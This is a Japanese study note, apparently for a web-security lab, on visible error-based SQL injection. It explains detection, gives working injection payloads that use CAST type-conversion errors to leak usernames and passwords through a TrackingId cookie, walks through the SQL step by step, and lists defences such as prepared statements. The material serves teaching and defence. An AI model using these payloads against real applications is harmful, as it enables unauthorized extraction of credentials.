
## 🔥 どんな脆弱性か（本質）
アプリが  
**SQLエラー内容をそのままユーザーに返してしまう**  
という設計ミスを突く脆弱性。

攻撃者は、わざと型変換エラーなどを起こすことで  
**本来見えないデータ（ユーザー名・パスワードなど）がエラーメッセージに露出する**。

例：  
`CAST((SELECT password FROM users LIMIT 1) AS int)`  
→ 文字列をintに変換できず、エラー文にパスワードが表示される。

---

## 🔍 どう気づくか（検出ポイント）
1. **シングルクォート `'` を入れるとSQLエラーが返る**  
   → SQLに直接埋め込まれている証拠。

2. **エラーメッセージにSQL文の断片が見える**  
   → DBの種類や構造が推測できる。

3. **CAST() や型変換を使うと “変換できなかった値” がエラーに表示される**  
   → データ抽出が可能と判断。

---

## 🎯 どう攻撃するか（攻撃フロー）
### 1. 脆弱性確認
`TrackingId=xxx'`  
→ SQLエラーが返る → 注入可能。

### 2. コメントアウトで構文を整える
`TrackingId=xxx'--`  
→ エラーが消える → インジェクション位置確定。

### 3. CAST() を使ってデータをエラーに吐かせる
`' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`

→  
`ERROR: invalid input syntax for type integer: "administrator"`

このように、**DBが変換できなかった文字列をそのままエラーに表示する**ため、  
ユーザー名・パスワードが直接見える。

### 4. OFFSETで複数行を取得
`LIMIT 1 OFFSET 1`  
→ 2行目のデータも取得可能。

---

## 🛡️ どう対策するか（実務レベル）
- **プリペアドステートメント（最重要）**  
  SQL文とデータを分離し、文字列連結を禁止する。

- **詳細なSQLエラーをユーザーに返さない**  
  → ログには残すが、ユーザーには一般的なエラー画面だけ返す。

- **WAF・レート制限**  
  型変換エラーや不自然なCASTを検知してブロック。

- **入力値のサニタイズ**  
  特にCookieやヘッダなど「開発者が油断しがちな場所」をチェック。

---

## 🧩 まとめ（暗記用）
> **「Visible error-based SQL Injection は、アプリがSQLエラーをそのまま返す設計ミスを悪用し、  
> CAST などで型変換エラーを起こして内部データをエラーメッセージに露出させる攻撃です。  
> シングルクォートでエラーが出ることで気づき、CAST((SELECT …) AS int) を使うと  
> “変換できなかった値” としてユーザー名やパスワードが直接表示されます。  
> 対策はプリペアドステートメントの徹底、詳細エラーの非表示、  
> そしてWAFやレート制限による異常検知です。」**

---
<br>
<br>
<br>




## CAST()でデータがエラーに出てくる仕組み

### まず「何が起きているか」を日本語で

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

これは「**文字列を無理やりint（整数）に変換しろ**」という命令。

---

### 順番に分解すると

**① DBが中で動かす処理**
```sql
SELECT username FROM users LIMIT 1
-- → "administrator" という文字列が取れる
```

**② 次にそれをintに変換しようとする**
```sql
CAST("administrator" AS int)
-- → ❌ "administrator"は数字じゃない！変換できない！
```

**③ DBがエラーを投げる**
```
ERROR: invalid input syntax for type integer: "administrator"
                                               ↑
                                    変換できなかった値をそのまま表示してしまう
```

---

### ポイントはここ

DBはエラーメッセージに「**何が変換できなかったか**」を親切に教えてくれる。

その"何が"の部分が、**SELECT文で取ってきたデータそのもの**。

```
"administratorが整数じゃないからダメでした"
　　↑
　これがパスワードやユーザー名になる
```

---

### 図で整理

```
攻撃者のSQL注入
      ↓
SELECT username → "administrator" を取得
      ↓
CAST("administrator" AS int) を実行
      ↓
❌ 変換失敗
      ↓
DB「integer変換できないよ: 'administrator'」とエラー出力
      ↓
アプリがそのエラーをそのままブラウザに返す
      ↓
攻撃者の画面に "administrator" が見える 👀
```

---

### 一言でいうと

> **「DBに無理な計算をさせて、失敗したときのエラー文に取りたいデータを混ぜ込む」


<br>
<br>
<br>
<br>
<br>
<br>



## もっと細かく分解する

---

### そもそも CAST() って何？

```sql
CAST("123" AS int)   → ✅ 123　（文字列"123"を数字123に変換できる）
CAST("hello" AS int) → ❌ エラー（"hello"は数字じゃない）
```

**「このデータを〇〇型に変換して」という命令。**
変換できない場合、DBはエラーを投げる。

---

### SELECT文を思い出す

```sql
SELECT username FROM users LIMIT 1
```

これを実行すると、DBの中から…

```
┌───────────────┐
│   username    │
├───────────────┤
│ administrator │  ← これが返ってくる（文字列）
└───────────────┘
```
LIMIT 1 は「結果を 1 行だけ返す」ための句。
SQL の LIMIT は「返す行数を制限する」ための構文で、LIMIT 1 はその中でも最小単位の「1 行だけ取ってくる」という意味。
---

### この2つを組み合わせると？

```sql
CAST( (SELECT username FROM users LIMIT 1) AS int )
```

**処理の順番：**

```
① まず内側が実行される
   SELECT username FROM users LIMIT 1
   → "administrator" が手に入る

② 次に外側が実行される
   CAST("administrator" AS int)
   → ❌ "administrator"は数字じゃない！！
```

---

### エラーが出る瞬間

DBが出すエラー文：

```
ERROR: invalid input syntax for type integer: "administrator"
```

分解すると…

```
ERROR:                          → エラーだよ
invalid input syntax            → 入力の形式がおかしいよ
for type integer:               → integerに変換しようとしたら
"administrator"                 → これが変換できなかったよ
 ↑
 ここ！！取りたかったデータが出てくる
```

---

### アプリ側の問題

```
普通のアプリ：
  エラー → 「エラーが発生しました」とだけ表示

脆弱なアプリ：
  エラー → DBのエラー文をそのままブラウザに表示
             ↓
  "administrator" がユーザーの画面に丸見え 👀
```

---

### 全体の流れを一本に

```
攻撃者が入力
  ↓
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
  ↓
DBが実行
  ↓
SELECT username → "administrator" 取得
  ↓
CAST("administrator" AS int) 実行
  ↓
❌ 変換失敗
  ↓
DBが正直に報告
「"administrator"をintに変換できませんでした」
  ↓
脆弱なアプリがそのままブラウザに返す
  ↓
攻撃者「ユーザー名はadministratorか、ありがとう😈」
```

---

### 一番シンプルに言うと

> **「わざと失敗させて、失敗メッセージにデータを乗せる」**

DBは失敗したとき「何が失敗したか」を教えてくれる。
その「何が」の部分に、盗みたいデータを入れ込む。

<br>
<br>
<br>
<br>
<br>
<br>

## SELECT文を完全に分解する

---

### まず「テーブル」をイメージする

DBの中はExcelみたいな表が入ってる。

```
usersテーブル
┌────┬───────────────┬──────────────┐
│ id │   username    │   password   │
├────┼───────────────┼──────────────┤
│  1 │ administrator │ abc123       │
│  2 │ wiener        │ pass456      │
│  3 │ carlos        │ qwerty       │
└────┴───────────────┴──────────────┘
```

---

### SELECT の意味

```sql
SELECT username FROM users
```

日本語に訳すと：

```
SELECT username   → "username"列を取ってきて
FROM users        → "users"テーブルから
```

結果：
```
┌───────────────┐
│   username    │
├───────────────┤
│ administrator │
│ wiener        │
│ carlos        │
└───────────────┘
```

全員のusernameが取れる。

---

### LIMIT 1 の意味

```sql
SELECT username FROM users LIMIT 1
```

```
LIMIT 1 → 1行だけ返して
```

結果：
```
┌───────────────┐
│   username    │
├───────────────┤
│ administrator │  ← 1行目だけ
└───────────────┘
```

---

### 全部つなげると

```
SELECT username   → usernameという列を
FROM users        → usersというテーブルから
LIMIT 1           → 1件だけ

→ "administrator" という文字列が返ってくる
```

---

### 一言で

> **「users表のusername列の、1行目だけ持ってきて」**
